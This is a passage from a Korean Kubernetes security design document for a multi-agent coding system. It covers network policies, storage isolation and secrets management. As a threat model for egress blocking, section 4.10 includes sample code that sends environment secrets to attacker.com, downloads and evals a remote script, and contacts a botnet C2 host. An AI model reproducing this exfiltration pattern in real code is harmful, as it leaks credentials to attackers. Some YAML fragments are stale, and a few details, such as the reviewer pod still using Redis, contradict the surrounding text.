| Pod | Ingress | Egress (NATS) | Egress (PostgreSQL) | Egress (외부 인터넷) |
|-----|---------|---------------|---------------------|---------------------|
| **gateway** | 사용자 터미널 | ✅ 4222 | ✅ 5432 | ✅ LLM, GitHub API |
| **coordinator** | ❌ | ✅ 4222 | ✅ 5432 | ✅ Semgrep, MCP |
| **nats** | ✅ 모든 Pod | ❌ | ❌ | ❌ |
| **postgresql** | ✅ gateway, coordinator | ❌ | ❌ | ❌ |
| **Worker (×3)** | ❌ | ✅ 4222 | ❌ | ❌ |

**v2와 차이점**:
- Redis Pod NetworkPolicy 제거 (NATS로 교체)
- 8개 Pod → 4+N 구조로 간소화
- internal-agents Pod 통합 (coordinator Pod로)
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
        - podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
```

**설계 근거**:
- **doc-manager, project-lead, junior**는 유사한 네트워크 요구사항 (Redis + PostgreSQL + MCP)
- 단일 NetworkPolicy로 관리하여 중복 제거
- 외부 API 접근 허용: MCP 도구(Context7, Serena) 사용 필요

### 4.10 설계 근거: 네트워크 제한의 효과

#### 4.10.1 Worker의 PostgreSQL 차단 이유

**시나리오**: Worker가 PostgreSQL에 접근하면 무엇이 문제인가?

```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
// 만약 Worker가 PostgreSQL에 접근 가능하다면?
class MaliciousWorker {
  async execute(task: DecomposedTask) {
    // 1. spec 메타데이터 직접 조작 (검증 우회)
    await db.query(`
      UPDATE spec_metadata SET status = 'approved'
      WHERE spec_id = $1
    `, [task.specId]);
    
    // 2. 다른 Worker의 작업 가로채기
    await db.query(`
      UPDATE task_queue SET assigned_to = $1 WHERE status = 'pending'
    `, [this.workerId]);
    
    // 3. 시행착오 DB 오염
    await db.query(`
      INSERT INTO trial_errors (question, answer, category)
      VALUES ('spam', 'spam', 'success')
    `);
  }
}
```

**차단 효과**:
- Worker는 PVC의 spec 파일 읽기로 작업 수신 (DB 접근 불필요)
- 진행 상황 업데이트는 spec 파일 `status` 필드 변경 → Watchman 감지 → NATS 핑으로 전달
- 데이터베이스 무결성 보장 (coordinator Pod만 spec 메타데이터 관리)

**v3.0.0 변경사항**:
- v2: Redis 작업 큐 폴링 → v3: spec 파일 기반 작업 수신
- Worker는 DB를 통한 작업 할당이 아닌 spec 파일 변경 감지로 작업 수신

#### 4.10.2 Worker의 외부 인터넷 제한 이유

**시나리오**: Worker가 무제한 외부 접근 가능하면?

```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
// 만약 Worker가 무제한 외부 접근 가능하다면?
class MaliciousWorker {
  async execute(task: DecomposedTask) {
    // 1. 민감 정보 유출
    const secrets = process.env;
    await fetch('https://attacker.com/exfiltrate', {
      method: 'POST',
      body: JSON.stringify(secrets),
    });
    
    // 2. 악성 스크립트 다운로드
    const malware = await fetch('https://attacker.com/malware.js');
    eval(await malware.text());
    
    // 3. 봇넷 C&C 통신
    await fetch('https://botnet-c2.com/register', {
      method: 'POST',
      body: JSON.stringify({ workerId: this.workerId }),
    });
  }
}
```

**차단 효과**:
- Worker는 외부 인터넷 완전 차단 (LLM API, npm registry 모두 불가)
- 공격자가 Worker를 침해해도 외부 유출 경로 없음
- 네트워크 로그 분석 시 이상 트래픽 탐지 용이

**v3.0.0 변경사항**:
- v2: npm registry 허용 → v3: 외부 인터넷 완전 차단
- Worker는 사전 정의된 작업만 수행 (동적 LLM 호출 불필요)

#### 4.10.3 NATS/PostgreSQL의 외부 접근 차단 이유

**시나리오**: 데이터베이스/메시지 브로커가 외부 노출되면?

- 브루트포스 공격으로 인증 우회 시도
- DDoS 공격으로 서비스 가용성 저하
- 데이터 유출 (spec 메타데이터, 시행착오, 알림 핑 메시지)

**차단 효과**:
- 내부 네트워크만 접근 가능 → 공격 표면 최소화
- 인증 실패 로그가 외부에서 발생하지 않음 (내부 Pod만 접근)
- 포트 스캔 방어

### 4.11 NetworkPolicy 적용 순서

1. **00-deny-all.yaml**: 기본 차단 정책 적용 (모든 Pod 통신 불가)
2. **nats.yaml**: NATS Pod ingress 허용 (모든 에이전트 → NATS)
3. **postgresql.yaml**: PostgreSQL Pod ingress 허용 (gateway, coordinator만)
4. **gateway.yaml**: gateway Pod egress 허용 (외부 인터넷 포함)
5. **coordinator.yaml**: coordinator Pod egress 허용 (NATS + PostgreSQL + MCP)
6. **worker.yaml**: Worker Pod egress 허용 (NATS만)

**설계 근거**:
- deny-all을 먼저 적용하여 기본 보안 강화
- 이후 각 Pod별 정책을 추가하여 필요한 통신만 허용
- 숫자 접두사(00-, 01-)로 적용 순서 명시

---

## 5. 스토리지 격리 전략 (PVC/emptyDir)

### 5.1 PVC 구성 개요

**설계 결정**: 단일 공유 PVC `workspace-pvc` 사용 (RWX, ReadWriteMany)

**설계 근거**:
- **Watchman 호환성**: PVC RWX는 inotify 이벤트를 정상적으로 발생시킴 (ConfigMap/Secret은 미발생)
- **파일 공유**: 모든 에이전트가 동일한 프로젝트 파일 시스템을 참조 (일관성 보장)
- **권한 분리**: volumeMounts의 `readOnly` 옵션으로 Pod별 쓰기 권한 제어
- **subPath 활용**: 특정 하위 디렉토리만 쓰기 가능하도록 세밀한 제어

**스토리지 백엔드 옵션**:
| 백엔드 | 장점 | 단점 | 추천 환경 |
|--------|------|------|----------|
| **AWS EFS** | 완전 관리형, RWX 지원, 자동 스케일링 | 비용 높음, 레이턴시 | AWS EKS |
| **Longhorn** | 오픈소스, 스냅샷/백업 내장, RWX 지원 | 자체 관리 필요 | 온프레미스, self-hosted K8s |
| **NFS** | 간단한 설정, 범용 | 단일 장애점, 성능 제한 | 개발/테스트 환경 |
| **Rook Ceph** | 고가용성, 분산 스토리지 | 복잡한 설정, 리소스 많이 소비 | 대규모 프로덕션 |

**권장**: 
- **프로덕션**: AWS EFS (관리 편의성) 또는 Longhorn (비용 최적화)
- **개발**: NFS 또는 hostPath (로컬 K8s)

### 5.2 PVC 매니페스트

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/storage/storage-class.yaml
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: agent-workspace-storage
provisioner: driver.longhorn.io  # 또는 efs.csi.aws.com
parameters:
  numberOfReplicas: "3"
  staleReplicaTimeout: "2880"
  fromBackup: ""
reclaimPolicy: Retain  # PVC 삭제 시 데이터 보존
allowVolumeExpansion: true
volumeBindingMode: Immediate
---
# k8s/storage/workspace-pvc.yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: workspace-pvc
  namespace: agent-system
spec:
  accessModes:
    - ReadWriteMany  # RWX: 여러 Pod가 동시에 읽기/쓰기
  storageClassName: agent-workspace-storage
  resources:
    requests:
      storage: 10Gi  # 프로젝트 크기 + 여유분
```

**설계 근거**:
- **RWX (ReadWriteMany)**: 여러 Pod가 동시에 마운트 필요 (gateway, coordinator, Worker 등)
- **Retain**: PVC 삭제 시 데이터 보존 (실수로 삭제해도 복구 가능)
- **10Gi**: 프로젝트 소스(~1Gi) + node_modules(~2Gi) + spec 파일(~1Gi) + 여유분(~6Gi)

**v3.0.0 핵심**:
- PVC는 **spec 파일의 공유 저장소** 역할 (Watchman이 파일 변경 감지)
- NATS는 "spec 파일이 변경됨" 알림 핑만 전달 (상세 정보는 PVC에서 읽음)

### 5.3 Pod별 볼륨 마운트 상세 테이블

| Pod 이름 | 마운트 경로 | 권한 | subPath | 설계 근거 |
|---------|----------|------|---------|-----------|
| **gateway Pod** | `/workspace` | RW (전체) | (없음) | consultant는 전체 프로젝트 탐색, git-manager는 전체 Git 작업 수행 |
| **coordinator Pod** | `/workspace` | RW (전체) | (없음) | spec-manager는 spec 파일 관리, project-lead는 프로젝트 분석, reviewer는 코드 검토 |
| **Worker Pod ×3** | `/workspace` | RO (전체) | (없음) | spec 파일 읽기, 프로젝트 원본 참조만 (쓰기 불가) |
| | `/scratch` | RW | emptyDir | 임시 작업 공간 (Pod 재시작 시 삭제) |
| | `/tmp` | RW | emptyDir | Node.js 캐시, 임시 파일 |

**v3.0.0 변경사항**:
- **multi-container pod 통합**: gateway Pod에 consultant + git-manager, coordinator Pod에 spec-manager + project-lead + reviewer
- **spec 파일 중심**: 모든 Pod가 `/workspace/specs/*.yaml` 접근 (Watchman 감지 대상)

### 5.4 Pod별 volumeMounts YAML 예시

#### 5.4.1 gateway Pod (전체 쓰기 권한)

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/deployments/gateway.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: gateway
  namespace: agent-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: gateway
  template:
    metadata:
      labels:
        app: gateway
    spec:
      containers:
        - name: consultant
          image: blog-consultant:latest
          volumeMounts:
            - name: workspace
              mountPath: /workspace
              # readOnly 없음 = RW 권한
          env:
            - name: WORKSPACE_ROOT
              value: "/workspace"
        
        - name: git-manager
          image: blog-git-manager:latest
          volumeMounts:
            - name: workspace
              mountPath: /workspace
          env:
            - name: GIT_PUSH_DISABLED
              value: "true"  # push 금지
      
      volumes:
        - name: workspace
          persistentVolumeClaim:
            claimName: workspace-pvc
```

#### 5.4.2 coordinator Pod (multi-container, 전체 읽기 + spec 쓰기)

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/deployments/coordinator.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: coordinator
  namespace: agent-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: coordinator
  template:
    metadata:
      labels:
        app: coordinator
    spec:
      containers:
        - name: spec-manager
          image: blog-spec-manager:latest
          volumeMounts:
            - name: workspace
              mountPath: /workspace
              # spec 파일 관리 권한 필요
          env:
            - name: SPEC_DIR
              value: "/workspace/specs"
        
        - name: project-lead
          image: blog-project-lead:latest
          volumeMounts:
            - name: workspace
              mountPath: /workspace
              readOnly: true  # 읽기만 (spec은 spec-manager가 관리)
        
        - name: reviewer
          image: blog-reviewer:latest
          volumeMounts:
            - name: workspace
              mountPath: /workspace
              readOnly: true  # 코드 리뷰는 읽기만
      
      volumes:
        - name: workspace
          persistentVolumeClaim:
            claimName: workspace-pvc
```

**설계 근거**:
- **spec-manager**: spec 파일 쓰기 권한 (상태 업데이트)
- **project-lead, reviewer**: 읽기만 (spec 파일 분석)
- **localhost 네트워크 공유**: 3개 컨테이너가 동일 Pod 내에서 IPC 통신 가능

#### 5.4.3 Worker Pod (emptyDir + PVC RO)

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/deployments/worker.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: worker
  namespace: agent-system
spec:
  replicas: 0  # KEDA가 관리
  selector:
    matchLabels:
      app: agent-worker
  template:
    metadata:
      labels:
        app: agent-worker
    spec:
      containers:
        - name: worker
          image: blog-agent-worker:latest
          volumeMounts:
            # 1. 프로젝트 원본 + spec 파일 (읽기 전용)
            - name: workspace
              mountPath: /workspace
              readOnly: true
            
            # 2. 임시 작업 공간 (쓰기 가능, Pod 재시작 시 삭제)
            - name: scratch
              mountPath: /scratch
            
            # 3. Node.js 캐시 (npm, pnpm 캐시)
            - name: tmp
              mountPath: /tmp
          env:
            - name: WORKSPACE_ROOT
              value: "/workspace"
            - name: SPEC_DIR
              value: "/workspace/specs"  # spec 파일 읽기
            - name: SCRATCH_DIR
              value: "/scratch"
          resources:
            requests:
              cpu: "500m"
              memory: "512Mi"
            limits:
              cpu: "1000m"
              memory: "1Gi"
      volumes:
        - name: workspace
          persistentVolumeClaim:
            claimName: workspace-pvc
            readOnly: true
        
        - name: scratch
          emptyDir:
            sizeLimit: 500Mi  # 최대 500Mi (디스크 초과 방지)
        
        - name: tmp
          emptyDir:
            sizeLimit: 200Mi
```

**설계 근거**:
- **PVC RO**: Worker는 원본 프로젝트를 수정하지 않음 (diff 생성 후 제출)
- **emptyDir sizeLimit**: 디스크 초과로 인한 노드 장애 방지 (500Mi 제한)
- **Pod 재시작 시 삭제**: `/scratch`는 영속 불필요 (작업 결과는 spec 파일 업데이트로 전달)

### 5.5 Worker의 spec 파일 기반 작업 패턴

```mermaid
sequenceDiagram
    participant PVC as PVC /workspace<br/>(RO for Worker)
    participant W as Worker Pod
    participant S as /scratch emptyDir<br/>(RW)
    participant SPEC as spec 파일<br/>(PVC, RO for Worker)
    participant NATS as NATS<br/>(알림 핑만)
    participant SM as spec-manager<br/>(coordinator Pod)
    
    Note over W: NATS 구독 대기
    NATS->>W: spec 변경 핑<br/>{ type: "spec.updated", specId, path }
    W->>SPEC: spec 파일 읽기<br/>(status: "assigned")
    
    W->>PVC: 원본 파일 읽기<br/>(Button.tsx, ...)
    W->>S: /scratch에 프로젝트 복사
    
    loop 개발 사이클
        W->>S: 코드 작성 (/scratch/src/Button.tsx)
        W->>S: 테스트 작성 (/scratch/tests/Button.test.tsx)
        W->>W: pnpm test (로컬 실행)
        W->>W: pnpm lint --fix
    end
    
    Note over W: 개발 완료
    W->>W: diff 생성<br/>(PVC 원본 vs /scratch)
    W->>SPEC: spec 파일 status 변경<br/>("completed" + diff 경로)
    
    Note over SM: Watchman 감지
    SM->>SPEC: spec 파일 변경 감지
    SM->>NATS: spec 완료 핑<br/>{ type: "spec.completed", specId }
```

**프로세스 상세**:

1. **작업 수신**: Worker는 NATS 구독으로 "spec 파일 변경됨" 알림 수신
2. **spec 파일 읽기**: PVC `/workspace/specs/{specId}.yaml`에서 작업 상세 정보 읽기
3. **원본 읽기**: PVC `/workspace`에서 필요한 파일 읽기
4. **복사**: `/scratch`에 프로젝트 구조 복제 (필요한 파일만 선택적 복사)
5. **개발**: `/scratch`에서 코드 작성 + 테스트 작성 + 린트 적용
6. **diff 생성**:
   ```bash
   # Worker 내부에서 실행되는 명령어 (개념)
   diff -Naur /workspace /scratch > /tmp/submission.diff
   ```
7. **결과 제출**: spec 파일의 `status: completed`, `result.diffPath: /workspace/diffs/{specId}.diff` 업데이트
8. **정리**: 작업 완료 후 `/scratch` 정리 (다음 작업 대비)

**v3.0.0 핵심 변경**:
- v2: Redis Stream으로 diff 제출 → v3: spec 파일 `status` 필드 업데이트
- Worker는 **spec 파일에 쓰기 불가** → diff를 `/workspace/diffs/` (spec-manager가 쓰기 가능 영역)에 저장하고 경로만 spec 파일에 기록

### 5.6 diff 생성 및 spec 업데이트 코드 예시

```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
import { execSync } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import YAML from 'yaml';

class SpecBasedWorker {
  private workspaceRoot = '/workspace';
  private scratchDir = '/scratch';
  private specDir = '/workspace/specs';
  private diffDir = '/workspace/diffs';

  async processSpec(specId: string): Promise<void> {
    // 1. spec 파일 읽기 (RO)
    const specPath = path.join(this.specDir, `${specId}.yaml`);
    const specContent = await fs.promises.readFile(specPath, 'utf-8');
    const spec = YAML.parse(specContent);
    
    if (spec.status !== 'assigned') {
      console.log(`Spec ${specId} not assigned, skipping`);
      return;
    }
    
    // 2. 원본 파일 복사
    await this.prepareScratch(spec.files);
    
    // 3. 코드 작성 (생략)
    await this.developCode(spec);
    
    // 4. diff 생성
    const diffContent = await this.generateDiff();
    
    // 5. diff 파일 저장 (/workspace/diffs는 spec-manager가 관리)
    const diffPath = path.join(this.diffDir, `${specId}.diff`);
    await fs.promises.writeFile(diffPath, diffContent);
    
    // 6. spec 파일 업데이트 (YAML 조작 후 다시 쓰기)
    spec.status = 'completed';
    spec.result = {
      diffPath: `/workspace/diffs/${specId}.diff`,
      completedAt: new Date().toISOString(),
    };
    await fs.promises.writeFile(specPath, YAML.stringify(spec));
    
    // 7. /scratch 정리
    await this.cleanupScratch();
  }

  async prepareScratch(files: string[]): Promise<void> {
    // 필요한 파일만 /scratch에 복사 (전체 복사는 비효율)
    for (const file of files) {
      const srcPath = path.join(this.workspaceRoot, file);
      const dstPath = path.join(this.scratchDir, file);
      
      // 디렉토리 구조 생성
      await fs.promises.mkdir(path.dirname(dstPath), { recursive: true });
      
      // 파일 복사
      if (fs.existsSync(srcPath)) {
        await fs.promises.copyFile(srcPath, dstPath);
      }
    }
  }

  async generateDiff(): Promise<string> {
    const changedFiles = await this.findChangedFiles();
    let unifiedDiff = '';

    for (const file of changedFiles) {
      const originalPath = path.join(this.workspaceRoot, file);
      const modifiedPath = path.join(this.scratchDir, file);

      // unified diff 생성
      try {
        const diff = execSync(
          `diff -u "${originalPath}" "${modifiedPath}"`,
          { encoding: 'utf-8' }
        );
        unifiedDiff += diff;
      } catch (error) {
        // diff는 차이가 있으면 exit code 1 반환 (정상)
        if (error.status === 1) {
          unifiedDiff += error.stdout;
        } else {
          throw error;
        }
      }
    }

    return unifiedDiff;
  }

  private async findChangedFiles(): Promise<string[]> {
    // /scratch에서 수정된 파일 목록 찾기
    const result = execSync(
      `find ${this.scratchDir} -type f -newer ${this.scratchDir}/.start-marker`,
      { encoding: 'utf-8' }
    );
    
    return result
      .split('\n')
      .filter(Boolean)
      .map(f => path.relative(this.scratchDir, f));
  }

  async cleanupScratch(): Promise<void> {
    // 다음 작업을 위해 /scratch 정리
    await fs.promises.rm(this.scratchDir, { recursive: true, force: true });
    await fs.promises.mkdir(this.scratchDir, { recursive: true });
  }
}
```

### 5.7 Watchman과 PVC 호환성

**중요 주의사항**:

> ⚠️ **K8s에서 Watchman 사용 시 주의사항**
>
> - **ConfigMap/Secret 볼륨**: `inotify IN_MODIFY` 이벤트를 발생시키지 않음 (심볼릭 링크 교체 방식)
> - **PVC (EFS/NFS/Longhorn RWX)**: inotify 이벤트 정상 발생 ✅
> - **emptyDir**: inotify 이벤트 정상 발생 ✅
> - **hostPath**: inotify 이벤트 정상 발생 ✅ (단, 보안 위험)

**설계 결정**: spec 파일은 **PVC RWX**로 마운트하여 Watchman 호환성 보장

**Watchman 설정 예시**:

```json
// ⚠️ 로직 이해용 예시 — 실제 설정은 구현 Phase에서 확정
// /workspace/.watchmanconfig
{
  "ignore_dirs": [
    "node_modules",
    ".git",
    "dist",
    "build",
    ".next",
    ".cache"
  ],
  "settle": 100
}
```

**Watchman 트리거 설정** (doc-manager Pod 예시):

```json
// ⚠️ 로직 이해용 예시 — 실제 설정은 구현 Phase에서 확정
// doc-manager Pod의 Watchman 트리거
{
  "triggers": [
    {
      "name": "spec-change",
      "expression": [
        "allof",
        ["dirname", "specs"],
        ["suffix", ".yaml"]
      ],
      "command": ["node", "/app/triggers/on-spec-change.js"]
    },
    {
      "name": "doc-change",
      "expression": [
        "allof",
        ["dirname", "docs"],
        ["anyof", ["suffix", ".md"], ["suffix", ".mdx"]]
      ],
      "command": ["node", "/app/triggers/on-doc-change.js"]
    }
  ]
}
```

### 5.8 설계 근거: 왜 Worker를 읽기 전용으로 하는가

#### 5.8.1 문제 시나리오: Worker가 쓰기 권한을 가진다면?

```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
// 만약 Worker가 PVC에 직접 쓰기 가능하다면?
class ProblematicWorker {
  async execute(task: DecomposedTask) {
    // Worker A: Button.tsx 작성 중
    await fs.writeFile('/workspace/src/Button.tsx', codeA);
    
    // 동시에 Worker B: Button.tsx 수정 시도 → 충돌!
    await fs.writeFile('/workspace/src/Button.tsx', codeB);
    
    // Worker A가 아직 작업 중인데 Worker B가 덮어씀
    // 결과: A의 작업이 유실, 원자성 보장 안됨
  }
}
```

#### 5.8.2 읽기 전용 + diff 제출의 장점

| 문제 | Worker 직접 쓰기 | Worker RO + diff | 효과 |
|------|-----------------|------------------|------|
| **동시 수정 충돌** | 마지막 쓰기가 이전 작업 덮어씀 | diff 제출 → Git Manager가 직렬화 | 충돌 원천 방지 |
| **롤백 불가능** | 잘못된 코드가 즉시 반영 | diff 검증 후 적용 | 불량 코드 차단 |
| **테스트 오염** | 테스트 실패 시 반쯤 수정된 파일 남음 | `/scratch`에서 테스트 → 실패 시 제출 안함 | 메인 프로젝트 오염 없음 |
| **추적 불가능** | 누가 수정했는지 불명확 | diff 메타데이터에 workerId 포함 | 변경 이력 추적 |
| **리뷰 우회** | 코드가 즉시 반영 | Git Manager → reviewer 경유 | 품질 보장 |

#### 5.8.3 subPath 분리의 장점

**시나리오**: doc-manager가 전체 쓰기 권한을 가진다면?

- 실수로 `src/` 디렉토리를 수정 → 코드 오염
- 명세서 관리 로직 버그로 `.git/` 디렉토리 손상 → Git 이력 유실

**subPath 분리 효과**:
- doc-manager는 `docs/`, `specs/`만 쓰기 가능
- 실수로 다른 경로를 수정하려 해도 permission denied (파일 시스템 레벨)
- 최소 권한 원칙 적용 (Principle of Least Privilege)

### 5.9 스토리지 용량 관리

| Pod | 스토리지 유형 | 용량 | 정리 정책 |
|-----|-------------|------|----------|
| **PVC workspace-pvc** | EFS/Longhorn | 10Gi | 수동 정리 (사용자 승인) |
| **Worker /scratch** | emptyDir | 500Mi | Pod 재시작 시 자동 삭제 |
| **Worker /tmp** | emptyDir | 200Mi | Pod 재시작 시 자동 삭제 |
| **PostgreSQL data** | PVC | 5Gi | Retain (백업 필요) |

**설계 근거**:
- **PVC**: 프로젝트 소스 + spec 파일 영속 필요 (Git 이력 + 명세서 유지)
- **Worker emptyDir**: 임시 작업물은 diff 제출 후 불필요 (Pod 종료 시 삭제로 디스크 절약)
- **PostgreSQL PVC**: spec 메타데이터, 시행착오 DB는 영속 필요 (백업 전략 필수)

**v3.0.0 변경사항**:
- Redis emptyDir 제거 (NATS는 메모리만 사용, 영속 스토리지 불필요)

---

## 6. 시크릿 관리 (Secrets Management)

### 6.1 시크릿 분류 및 Pod별 할당

| 시크릿 종류 | 필요한 Pod | 용도 | 저장 위치 |
|----------|----------|------|----------|
| **LLM API 키** | gateway, coordinator | OpenAI/Anthropic API 호출 | K8s Secret `llm-api-keys` |
| **PostgreSQL 비밀번호** | gateway, coordinator | DB 접근 (spec 메타데이터, 시행착오) | K8s Secret `pg-secret` |
| **GitHub 토큰** | gateway Pod (git-manager) | PR/Issue 생성 (push 금지) | K8s Secret `github-secret` |
| **Semgrep API 키** | coordinator Pod (reviewer) | 보안 스캔 | K8s Secret `semgrep-secret` |
| **NATS 인증 토큰** | gateway, coordinator, Worker | NATS 접근 인증 | K8s Secret `nats-auth` |

**설계 근거**:
- **Pod별 분리**: 각 Pod는 필요한 시크릿만 접근 (최소 노출 원칙)
- **Worker는 DB 비밀번호 불필요**: spec 파일 읽기로 작업 수신 (DB 접근 불필요)
- **Worker는 LLM API 키 불필요**: 사전 정의된 작업만 수행 (동적 LLM 호출 불필요)
- **NATS 인증**: 토큰 기반 인증으로 내부 Pod만 접근 허용

**v3.0.0 변경사항**:
- Redis 비밀번호 제거 → NATS 인증 토큰 추가
- 8개 Pod → 4+N 구조로 간소화 (시크릿 관리 단순화)

### 6.2 K8s Secret 매니페스트 예시

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/secrets/llm-api-keys.yaml
apiVersion: v1
kind: Secret
metadata:
  name: llm-api-keys
  namespace: agent-system
type: Opaque
stringData:
  openai-api-key: "sk-proj-..."  # Base64 인코딩 불필요 (stringData 사용 시)
  anthropic-api-key: "sk-ant-..."
---
# k8s/secrets/nats-auth.yaml
apiVersion: v1
kind: Secret
metadata:
  name: nats-auth
  namespace: agent-system
type: Opaque
stringData:
  # NATS 토큰 기반 인증
  token: "nats-secret-token-here"
  # NATS URL (클러스터 내부)
  url: "nats://nats.agent-system.svc.cluster.local:4222"
---
# k8s/secrets/pg-secret.yaml
apiVersion: v1
kind: Secret
metadata:
  name: pg-secret
  namespace: agent-system
type: Opaque
stringData:
  postgres-password: "pg-admin-password"
  # 읽기/쓰기 사용자 (gateway, coordinator)
  rw-username: "agent_rw"
  rw-password: "rw-password"
  rw-url: "postgresql://agent_rw:rw-password@postgresql.agent-system.svc.cluster.local:5432/agent_db"
---
# k8s/secrets/github-secret.yaml
apiVersion: v1
kind: Secret
metadata:
  name: github-secret
  namespace: agent-system
type: Opaque
stringData:
  token: "ghp_..."  # GitHub Personal Access Token
  # 또는 GitHub App credentials
  app-id: "123456"
  private-key: |
    -----BEGIN RSA PRIVATE KEY-----
    ...
    -----END RSA PRIVATE KEY-----
---
# k8s/secrets/semgrep-secret.yaml
apiVersion: v1
kind: Secret
metadata:
  name: semgrep-secret
  namespace: agent-system
type: Opaque
stringData:
  api-key: "semgrep-api-key-here"
```

**보안 주의사항**:
- ⚠️ **Git에 커밋 금지**: Secret 매니페스트는 `.gitignore`에 추가 또는 암호화 저장 (SealedSecrets, SOPS)
- ⚠️ **Base64는 암호화 아님**: K8s Secret은 Base64 인코딩일 뿐, 암호화되지 않음 (etcd 암호화 설정 필요)
- ✅ **External Secret Operator 권장**: AWS Secrets Manager, Vault 등 외부 시크릿 매니저와 연동

### 6.3 Pod별 환경변수 매핑

#### 6.3.1 gateway Pod (LLM + NATS + PostgreSQL + GitHub)

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/deployments/gateway.yaml (환경변수 부분)
spec:
  containers:
    - name: consultant
      env:
        # LLM API 키
        - name: OPENAI_API_KEY
          valueFrom:
            secretKeyRef:
              name: llm-api-keys
              key: openai-api-key
        - name: ANTHROPIC_API_KEY
          valueFrom:
            secretKeyRef:
              name: llm-api-keys
              key: anthropic-api-key
        
        # NATS
        - name: NATS_URL
          valueFrom:
            secretKeyRef:
              name: nats-auth
              key: url
        - name: NATS_TOKEN
          valueFrom:
            secretKeyRef:
              name: nats-auth
              key: token
        
        # PostgreSQL (읽기/쓰기)
        - name: DATABASE_URL
          valueFrom:
            secretKeyRef:
              name: pg-secret
              key: rw-url
        
        # 애플리케이션 설정
        - name: NODE_ENV
          value: "production"
        - name: LOG_LEVEL
          value: "info"
    
    - name: git-manager
      env:
        # GitHub (push 금지는 애플리케이션 레벨 제어)
        - name: GITHUB_TOKEN
          valueFrom:
            secretKeyRef:
              name: github-secret
              key: token
        - name: GIT_PUSH_DISABLED
          value: "true"
        
        # NATS
        - name: NATS_URL
          valueFrom:
            secretKeyRef:
              name: nats-auth
              key: url
        - name: NATS_TOKEN
          valueFrom:
            secretKeyRef:
              name: nats-auth
              key: token
```

#### 6.3.2 Worker Pod (NATS만)

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/deployments/worker.yaml (환경변수 부분)
spec:
  containers:
    - name: worker
      env:
        # NATS만 (LLM/DB 접근 불필요)
        - name: NATS_URL
          valueFrom:
            secretKeyRef:
              name: nats-auth
              key: url
        - name: NATS_TOKEN
          valueFrom:
            secretKeyRef:
              name: nats-auth
              key: token
        
        # Worker 식별
        - name: AGENT_TYPE
          value: "background-dev"
        - name: WORKER_ID
          valueFrom:
            fieldRef:
              fieldPath: metadata.name  # Pod 이름을 Worker ID로 사용
```

#### 6.3.3 reviewer Pod (Redis + PostgreSQL RO + Semgrep)

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/deployments/reviewer.yaml (환경변수 부분)
spec:
  containers:
    - name: reviewer
      env:
        # Redis
        - name: REDIS_URL
          valueFrom:
            secretKeyRef:
              name: redis-secret
              key: url
        
        # PostgreSQL (읽기 전용)
        - name: DATABASE_URL
          valueFrom:
            secretKeyRef:
              name: pg-secret
              key: ro-url  # 읽기 전용 사용자
        
        # Semgrep
        - name: SEMGREP_API_KEY
          valueFrom:
            secretKeyRef:
              name: semgrep-secret
              key: api-key
```

### 6.4 시크릿 로테이션 전략

**수동 로테이션** (기본):
1. 새 시크릿 생성 (예: `llm-api-keys-v2`)
2. Pod의 `secretKeyRef.name` 업데이트
3. Pod 재시작 (`kubectl rollout restart deployment/opencode`)
4. 이전 시크릿 삭제

**자동 로테이션** (External Secret Operator 사용):

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/secrets/external-secret.yaml
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: llm-api-keys
  namespace: agent-system
spec:
  refreshInterval: 1h  # 1시간마다 동기화
  secretStoreRef:
    name: aws-secrets-manager  # 또는 vault-backend
    kind: SecretStore
  target:
    name: llm-api-keys
    creationPolicy: Owner
  data:
    - secretKey: openai-api-key
      remoteRef:
        key: prod/agent-system/openai-api-key
    - secretKey: anthropic-api-key
      remoteRef:
        key: prod/agent-system/anthropic-api-key
```

**설계 근거**:
- **자동 동기화**: AWS Secrets Manager에서 시크릿 변경 시 K8s Secret 자동 업데이트
- **중앙 관리**: 시크릿을 외부 매니저에서 통합 관리 (감사 로그, 버전 관리)
- **Pod 재시작 불필요**: Secret 업데이트 시 애플리케이션이 재로드 (구현 필요)

### 6.5 PostgreSQL 읽기 전용 사용자 생성

```sql
-- ⚠️ 로직 이해용 예시 — 실제 스키마는 구현 Phase에서 확정
-- PostgreSQL 초기화 스크립트

-- 읽기/쓰기 사용자 (OpenCode, doc-manager, project-lead, junior)
CREATE USER agent_rw WITH PASSWORD 'rw-password';
GRANT CONNECT ON DATABASE agent_db TO agent_rw;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO agent_rw;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO agent_rw;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO agent_rw;

-- 읽기 전용 사용자 (reviewer)
